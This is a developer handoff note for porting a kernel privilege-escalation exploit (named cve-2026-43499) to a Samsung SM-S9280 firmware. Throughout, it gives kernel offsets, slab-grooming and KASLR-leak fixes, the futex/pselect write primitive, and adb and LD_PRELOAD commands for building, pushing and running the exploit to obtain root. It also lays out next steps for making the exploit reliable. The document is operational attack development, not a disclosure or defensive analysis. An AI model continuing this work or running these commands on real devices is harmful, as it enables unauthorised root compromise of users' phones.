# S9280 (SM-S9280 / e3q-S9280ZCS6DZF2) Exploit Debugging Handoff

## Device Info

- Model: SM-S9280 (Galaxy S24 Ultra, China)
- SoC: Snapdragon 8 Gen 3 (E3Q platform)
- Firmware: `BP4A.251205.006/S9280ZCS6DZF2`
- Kernel: `6.1.145-android14-11-3254743-abS9280ZCS6DZF2`
- Android: 16, Security Patch: 2026-05-05
- ADB: shell (uid=2000), no root

## Target Header

`src/targets/e3q-S9280ZCS6DZF2/target.h` — fully populated from device BTF and vmlinux.elf.

Key differences from S928U (`e3q-S928USQS6DZF2`):
- `KMALLOC_CACHES_OFF`: `0x0176cbb8` (S928U: `0x0176c6f8`, delta +0x4c0)
- `SLIDE_NFULNL_LOGGER_OFF`: `0x016a65c5` (S928U: `0x016a61b8`)
- All other offsets identical

## Fixes Applied (with evidence)

### 1. MM_STRUCT_SZ: 0x500 -> 0x3c0

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:23`

BTF reports `sizeof(struct mm_struct) = 960 (0x3c0)`. The default `0x500` was wrong.

**Effect**: KernelSnitch mm_struct leak success rate improved from ~10% to ~60%.

### 2. MM_STRUCT_SLAB_SZ: new constant 0x400

**Files**: `src/common.h:64-66`, `src/targets/e3q-S9280ZCS6DZF2/target.h:25`

SLUB rounds mm_struct to kmalloc-1k. Device slabinfo confirms:
```
mm_struct  1000  1160  1024  32  8 : tunables 0 0 0 : slabdata 38 38 0
```
`obj_size=1024 (0x400)`, `objs_per_slab=32`.

Previously `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ = 32768/960 = 34` (wrong).
Now `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ = 32768/1024 = 32` (correct).

**Used in**: `src/util.c:746`, `src/pipe.c:131`

### 3. fops.c fd_set PSELECT_WORD_SHIFT support

**File**: `src/fops.c:77-128`

`prepare_pselect_fdsets()` was hardcoded for shift=0 layout. Rewrote to use
`fops_fdset_put_global()` which maps waiter words through `SLIDE_PSELECT_WORD_SHIFT`.

S9280 uses `SLIDE_PSELECT_WORD_SHIFT=3` (same as S928U, confirmed by identical
`__arm64_sys_pselect6` and `core_sys_select` stack frame layouts).

### 4. SKB_RECLAIM_SENDS and MM_DRAIN_TRIGGERS tuning

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:27-29`

Changed from defaults (4 sends, 32 drains) to S928U hardware-tested baseline:
- `SKB_RECLAIM_SENDS = 28`
- `APP_SLIDE_RECLAIM_SENDS = 28`
- `MM_DRAIN_TRIGGERS = 2`

### 5. Pipe fill before pselect (CRITICAL FIX)

**File**: `src/fops.c:174-184`

**Problem**: `pselect()` returned `ret=37` immediately because pipe write-end fds
in the `out` fd_set were always writable (pipe empty). pselect never blocked,
so the stale rt_mutex waiter window never opened, and `consumer` never ran
(`calls=0`).

**Fix**: Fill the pipe to capacity (65536 bytes) before calling pselect. This
makes write-end fds not writable, forcing pselect to block.

**Result**: `ret=37 calls=0` -> `ret=4 calls=1 success=1`. pselect now blocks
and PI boost wakes it up.

### 6. Consumer completion wait

**File**: `src/fops.c:203-216`

**Problem**: `consumer` thread runs on a different core. `pselect()` returns
before `consumer` finishes `sched_setattr`, so `consumer_success` reads 0
even though `sched_setattr` eventually succeeds.

**Fix**: Bounded 200ms wait loop after `pselect()` returns, polling
`consumer_calls` until non-zero.

### 7. prepare_ctx cleanup before sk_buff sends

**File**: `src/util.c:907-921`

**Problem**: `prepare_ctx` children (holding mm_struct references) were cleaned
up AFTER `sk_buff` reclaim sends. The target slab page could not return to the
buddy allocator because its objects were still pinned.

**Fix**: Moved `prepare_ctx` cleanup (close memfds + kill children) to BEFORE
the `sendmsg()` reclaim loop.

### 8. Consumer diagnostic logging

**File**: `src/main.c:123-127`

Added `pr_info` after consumer sequence completes, showing `calls`, `success`,
and `tid`. This revealed that `sched_setattr` succeeds but pselect reads
`success=0` due to the race (fixed by #6).

### 9. KernelSnitch bruteforce stride: MM_STRUCT_SZ -> MM_STRUCT_SLAB_SZ (MAJOR)

**Files**: `src/util.c` (`setup_kernelsnitch`, `prepare_kernel_page`)

**Root cause**: The bruteforce scanned mm_struct candidates at
`mm_struct_sz = 0x3c0` stride, but SLUB lays objects out at
`obj_size = 0x400` stride (see fix #2). A candidate matches a real object only
where `lcm(0x3c0, 0x400)` coincides: slab offsets `0x0`, `0x3c00`, `0x7800`
(slots 0, 15, 30). Only 3 of 32 slots were detectable, which explains the
~60% leak rate in the root-umh path and the 24/24 failures elsewhere.

**Effect**: Both the mm_struct leak and the pipe-buffer page leak now succeed
on essentially every attempt (observed object_index values 0, 8, 9, 10, 16,
17, 31 across runs). This is a generic bug that also affects the S928U target.

### 10. Pipe page child lifecycle aligned with prepare_kernel_page

**File**: `src/pipe.c` (`prepare_pipe_buffer_page_child`)

**Problem**: The app variant failed 24/24 with
`pipe KernelSnitch sk_buff page leak failed`. The function used
`clone_memfd()` (clone + open memfd + kill immediately), so all pre/spray/post
children were dead before collision finding, unlike the working root-umh path
which keeps children alive (paused) through setup and bruteforce.

**Fix**: Clone live children, open their memfds, and reap them only after the
bruteforce, mirroring `prepare_kernel_page`. Also moved
`run_kernelsnitch_bruteforce()` to right after `waitpid(leak_child)`, before
the mass memfd frees and sk_buff sends (same position as the working path).

### 11. pr_error exits: diagnostics after pr_error were dead code

**Files**: `src/kernelsnitch/utils.h` (definition), `src/slide_app.c`

`pr_error` ends with `exit(-1)`; the compiler eliminates anything after it.
The `P0_ORACLE_GATE_DIAG` post-failure gate verification placed after
`slide_trigger_physical_slot()` fails never executed (the process had already
exited inside the pr_error in `slide_trigger_physical_slot`). The hook now
runs inside `slide_trigger_physical_slot` before the pr_error.

### 12. Runtime tuning knobs (avoid rebuilds during sweeps)

**Files**: `src/util.c`, `src/pipe.c`, `src/main.c`, `src/slide_app.c`,
`src/common.h`

- `KSNITCH_DEFAULT_PROFILE=1`: skip the reduced app KernelSnitch profile
  (2048/64/8) and keep the library default (4096/128/8).
- `SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`: override the reclaim spray
  parameters at runtime.
- `EXPLOIT_CORE`: override the exploit CPU pin (`pin_to_core(CORE)` call
  sites now go through `exploit_core()`).
- `SLIDE_CONSUMER_BURST` / `SLIDE_CONSUMER_SPACING_USEC`: fire multiple
  staggered `sched_setattr` calls per route instead of one.
- `slide cmp_requeue_pi ret=... errno=... polls=...` logging added to the
  app trigger path (previously only the leak path logged it).

## Stack Layout Verification (disassembly)

**File**: `s9280-port/vmlinux.elf` (exact S9280ZCS6DZF2 kernel)

`__arm64_sys_pselect6`: `sub sp, #0x90` then `bl core_sys_select`.
`core_sys_select`: `sub sp, #0x1c0`; for nfds=320 (per-set bytes 0x28 < 0x2b)
the on-stack branch is taken with `stack_fds = sp + 0x50` (zeroed region
`sp+0x50..sp+0x140`, six 0x28-byte buffers).

With `E` = SP at `__arm64_sys_pselect6` entry: `stack_fds = E - 0x90 - 0x1c0 +
0x50 = E - 0x200` — byte-identical to the S928U record. The stale waiter at
`E - 0x1e8` is therefore `stack_fds + 0x18` = global word 3, and
`waiter->lock` (waiter + 0x38) = `stack_fds + 0x50` = ex-set word 0 = global
word 10 = `shift + 7`. **SLIDE_PSELECT_WORD_SHIFT=3 is confirmed for S9280 by
disassembly, matching S928U's panic readback.**

## Current Blocking Point

### PI chain walk rarely reaches the stale waiter (write window ~1/12)

**Location**: `src/slide_app.c` (`slide_pselect_stack_copy`), `src/fops.c`
(`do_pselect_fake_lock_route`)

**Confirmed working on S9280 (new evidence, 2026-07-31)**:

- `FUTEX_CMP_REQUEUE_PI` returns `-1 errno=35 (EDEADLK)` at `polls=1` — the
  PI deadlock setup (the bug precondition) reproduces on this device.
- `slide wait_requeue_pi ret=-1 errno=110 (ETIMEDOUT)` — the waiter stays
  blocked for the full 50 ms, consistent with the EDEADLK stale-waiter state.
- pselect stack layout / shift=3 verified by vmlinux disassembly (see above).
- One observed write window: `pselect returned ret=2 elapsed_usec=100815`
  (past the 100 ms timeout), i.e. the walk *can* fire — but it fired at the
  timeout boundary, not in response to the consumer's `sched_setattr`.

**Symptom**: In ~11/12 samples, pselect returns `ret=0` after the full
timeout (`elapsed_usec≈100170`) with `calls=1 sched_ok=1`. The consumer's
`sched_setattr` succeeds but the PI chain walk does not reach the stale
waiter during the pselect window. The gate oracle (240 pipes) confirms:
`gate hits=0 changed=0` — nothing was written.

**Interpretation**: At `sched_setattr` time the pselect task's
`pi_blocked_on` is usually already clear (or the waiter was dequeued), so
`rt_mutex_adjust_prio_chain` has no chain to walk. The walk only fires when
the stale-waiter state survives long enough — measured rate ~1/12, and the
one positive sample happened at the timeout boundary, suggesting the relevant
cleanup/re-link happens *late* relative to the consumer delay sweep
(15-50 ms). When the walk fires while the payload page was not reclaimed
(garbage `fake_lock`), the kernel panics: multiple device reboots observed,
including with `SLIDE_CONSUMER_BURST>=2`.

**This supersedes the earlier "cfi misc_fops mismatch: pread ret=0"
blocking point**: with fixes #9-#11 the leak stages are now reliable and the
app variant's P0 pipe oracle gives a direct reclaim+write measurement. The
remaining problem is making the PI chain walk reach the stale waiter inside
the pselect window, with a correctly reclaimed payload page.

### Previous blocking point (kept for reference)

The rb_tree write mechanism relies on `rb_erase` performing
`rb_set_parent_color(child=target, parent, color)`, i.e. writing the payload
pointer into the target:
- FOPS route: `rb_erase(fake_w0->pi_tree_entry)` with
  `parent = fake_fops`, `right = data_addr(ASHMEM_MISC_FOPS)`, `left = 0`.
- App gate route: `rb_erase(stale_waiter->tree_entry)` with
  `parent = slide_oracle_parent = direct_to_page(payload_base)`,
  `left = slide_oracle_target` (pipe_buffer address), `right = 0`.
Both need (1) the stale waiter linked in `f_pi_target`'s wait tree with
`pi_blocked_on` set, (2) sk_buff coverage of the payload page, (3) the walk
triggered by `sched_setattr` while pselect blocks.

## What Works

| Stage | Status | Evidence |
|-------|--------|----------|
| KASLR leak (tracefs) | Works | `slide-kaslr-ok base=ffffffc0080d0000` |
| KernelSnitch mm_struct leak | ~100% (was ~60%) | fix #9; leaked indices 0..31 |
| Pipe-buffer page leak (app) | ~100% (was 0/24) | fixes #9, #10 |
| sk_buff reclaim sends | 28/28 sent | `sk_buff reclaim sends=28/28` |
| pselect blocking | Works | `ret=0` after full timeout |
| FUTEX CMP_REQUEUE_PI EDEADLK | Works | `ret=-1 errno=35 polls=1` |
| WAIT_REQUEUE_PI timeout | Works | `ret=-1 errno=110` |
| consumer sched_setattr | Works | `calls=1 sched_ok=1` |
| pselect stack layout / shift=3 | Verified | vmlinux disassembly (see above) |
| PI walk reaching stale waiter | **~1/12** | one `ret=2 elapsed=100815` sample |
| rb write to target (gate/fops) | **Not yet observed** | `gate hits=0 changed=0` |

## Next Steps for the Next Person

The leak stages are reliable (see What Works). The remaining problem is the
~1/12 rate at which the PI chain walk reaches the stale waiter inside the
pselect window. The one positive sample fired at the timeout boundary
(~100 ms), while consumer delays of 15-50 ms never hit — the relevant
`pi_blocked_on` cleanup/re-link appears to happen *late*. Concrete plan:

### Priority 1: Sweep later consumer delays (most promising)

Force later consumer trigger times inside the 100 ms window:

```sh
adb shell "P0_ORACLE_GATE_DIAG=1 SLIDE_ENTER_DELAY_USEC=70000 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id"
```

Sweep 60-100 ms (`SLIDE_ENTER_DELAY_USEC` / `PSELECT_DELAY_USEC`). If the
walk rate climbs as the delay approaches the timeout boundary, the stale
waiter stays linked longer than assumed and the sweep should converge on a
reliable delay.

### Priority 2: Dense in-window triggers with consumer burst

Use `SLIDE_CONSUMER_BURST` + `SLIDE_CONSUMER_SPACING_USEC` to fire multiple
staggered `sched_setattr` calls across the window, raising the chance one
lands while the stale waiter is still linked. Note: `SLIDE_CONSUMER_BURST>=2`
increased panic frequency (the walk reaches a garbage fake_lock when the
payload page was not reclaimed), so run these scans in the background and
expect reboots.

### Priority 3: Capture gate oracle output on every opened window

Whenever pselect returns `ret>0` (window opened), the
`verify_p0_pipe_oracle_gate()` output is the ground truth:
- `gate hits>0` (a pipe reads back `RMG-P0-ORACLE-GATE`): reclaim + write
  chain fully works — the app flow should proceed to probe slot -> slide
  leak -> fops write -> root.
- `gate hits=0` with the window open: the walk fired but the payload page
  was not reclaimed, or the write mechanism (rb_set_parent_color target,
  derived from 6.1 source semantics, not yet verified on this device) does
  not hit. The S928U record also reports the oracle never flipping, so a
  write-mechanism mismatch remains possible even with a stable window.

One `ret=2` sample exited with `status=255` without gate output — the
verify path (SYSCHK/pr_error, which calls `exit(-1)`) may have died, or
the output was lost. Watch this closely on the next opened window.

### Priority 4: Re-run the root-umh variant

The root-umh variant has not been re-run since the stride fix (#9) — its
leak rate should also have jumped from ~60% to ~100%. Once any app-variant
progress is confirmed, or in parallel:

```sh
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499 /data/local/tmp/
adb shell "EXPLOIT_ATTEMPTS=8 EXPLOIT_ATTEMPT_TIMEOUT_SEC=45 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/id"
```

Success = `uid=0(root)`. The root variant uses UMH to invoke
`/data/local/tmp/cve-2026-43499-root` (su daemon, already pushed).

Kernel panics (device reboots) are an inherent cost of these scans — run
long sweeps in the background, write logs to files, and expect adb to drop
for ~60-90 s per reboot.

## Files Modified

All S9280-related changes are uncommitted working-tree changes (the
checkout is CRLF, so plain `git diff` shows whole-file noise — use
`git diff -w`). Do not commit yet.

| File | Changes |
|------|---------|
| `src/targets/e3q-S9280ZCS6DZF2/` | New target (untracked): header, fingerprint |
| `src/common.h` | `MM_STRUCT_SLAB_SZ`; runtime knobs (`SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`, `KSNITCH_DEFAULT_PROFILE`); `exploit_core()` declaration |
| `src/fops.c` | Shift-aware `prepare_pselect_fdsets`, pipe fill before pselect, consumer completion wait |
| `src/util.c` | KernelSnitch bruteforce stride `MM_STRUCT_SZ` -> `MM_STRUCT_SLAB_SZ` (fix #9); `EXPLOIT_CORE`/`exploit_core()`; cleanup before sends; knob plumbing |
| `src/pipe.c` | `objs_per_slab` uses `MM_STRUCT_SLAB_SZ`; pipe page child lifecycle aligned with `prepare_kernel_page` (fix #10) |
| `src/main.c` | `exploit_core()` call sites; consumer diagnostic logging |
| `src/slide_app.c` | `P0_ORACLE_GATE_DIAG` gate-verify on trigger failure; `cmp_requeue_pi` logging; `SLIDE_CONSUMER_BURST`/`SLIDE_CONSUMER_SPACING_USEC`; `SLIDE_ENTER_DELAY_USEC`/`PSELECT_DELAY_USEC` delay forcing |

## Build & Test

```sh
# Build (requires Android NDK r29)
export ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e3q-S9280ZCS6DZF2

# Test root-umh variant
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/cve-2026-43499
adb shell "EXPLOIT_ATTEMPTS=8 EXPLOIT_ATTEMPT_TIMEOUT_SEC=45 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/id"

# Test app variant (requires release build)
make TARGET=e3q-S9280ZCS6DZF2 release
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.release.so \
  /data/local/tmp/cve-2026-43499-app.so
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"

# P0 gate oracle scan (debug build, background, log to file)
make TARGET=e3q-S9280ZCS6DZF2
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.so \
  /data/local/tmp/cve-2026-43499-app-dbg.so
adb shell "P0_ORACLE_GATE_DIAG=1 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id" \
  > /tmp/gate-scan.log 2>&1
# Expect kernel panics / device reboots; adb returns after ~60-90 s.
# Files in /data/local/tmp survive reboots.
```

On this machine: `adb` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/platform-tools/adb.exe`
(WSL interop), `ANDROID_NDK_HOME` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/ndk/29.0.14206865`

## References

- S928U debugging record: `docs/SM-S928U1-S928U1UES6DZF2.md`
- Porting guide: `docs/PORTING.md`
- Project README: `README.md`
